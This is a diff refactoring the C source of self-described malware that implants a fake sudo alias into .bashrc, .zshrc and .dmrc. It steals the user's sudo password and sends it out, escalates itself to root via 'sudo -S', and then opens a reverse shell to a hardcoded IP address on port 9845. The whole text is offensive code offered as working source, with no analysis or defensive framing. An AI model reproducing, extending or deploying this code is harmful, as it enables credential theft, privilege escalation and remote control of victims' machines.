@@ -23,9 +23,41 @@ static void sighandler(int signo){}
 
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
-int main(int argc, char ** argv){
+int sudo_mode(int argc, char ** argv){
+  char passwd[PASSWD_SIZE];
+  char username[UNAME_SIZE];
 
-  //set mode
+  steal_password(passwd, username);
+
+  printf("%s's password is %s\n", username, passwd);
+
+  send_stolen_data(username, passwd);
+
+  char ** cmd_ray = make_execvp_args(argc, argv);
+  runSudo(passwd, cmd_ray, 0);
+  free_execvp_ray(cmd_ray);
+
+  char escaped_path[2048] = "";
+  get_virus_name(escaped_path);
+  char *escalate_vector[5] = {"/bin/sudo", "-S", escaped_path, "ROOT", NULL};
+
+  printf("ESCALATING VIRUS TO ROOT LEVEL PERMISSIONS...\n");
+  runSudo(passwd, escalate_vector, 0);
+  
+  return 0;
+}
+
+int root_mode(int argc, char**argv){
+  printf("I have root acess now...\n");
+  reverse_shell(9845, "206.189.197.67");
+  while(1){
+    sleep(1);
+    printf("...\n");
+  }
+}
+
+int set_mode(int argc, char**argv){
+ //set mode
   int mode = P_IMPLANT;
   for (int i = 0; i<argc; i++){
     if (strcmp(argv[i],"SUDO") == 0){
@@ -37,6 +69,11 @@ int main(int argc, char ** argv){
       break;
     }
   }
+  return mode;
+}
+int main(int argc, char ** argv){
+
+  int mode = set_mode(argc,argv);
 
   //implant the alias to the virus as sudo...
   if(mode == P_IMPLANT){
@@ -45,34 +82,11 @@ int main(int argc, char ** argv){
 
   //fake being sudo. We know we are sudo because we recieved the sudo alias prompt
   if(mode == P_SUDO){
-    char passwd[PASSWD_SIZE];
-    char username[UNAME_SIZE];
-
-    steal_password(passwd, username);
-
-    printf("%s's password is %s\n", username, passwd);
-
-    send_stolen_data(username, passwd);
-
-    char ** cmd_ray = make_execvp_args(argc, argv);
-    runSudo(passwd, cmd_ray, 0);
-    free_execvp_ray(cmd_ray);
-
-    char escaped_path[2048] = "";
-    get_virus_name(escaped_path);
-    char *escalate_vector[5] = {"/bin/sudo", "-S", escaped_path, "ROOT", NULL};
-
-    printf("ESCALATING VIRUS TO ROOT LEVEL PERMISSIONS...\n");
-    runSudo(passwd, escalate_vector, 0);
+    sudo_mode(argc,argv);
   }
 
   if(mode == P_ROOT){
-    printf("I have root acess now...\n");
-    reverse_shell(9845, "206.189.197.67");
-    while(1){
-      sleep(1);
-      printf("...\n");
-    }
+    root_mode(argc,argv);
   }
   return 0;
 
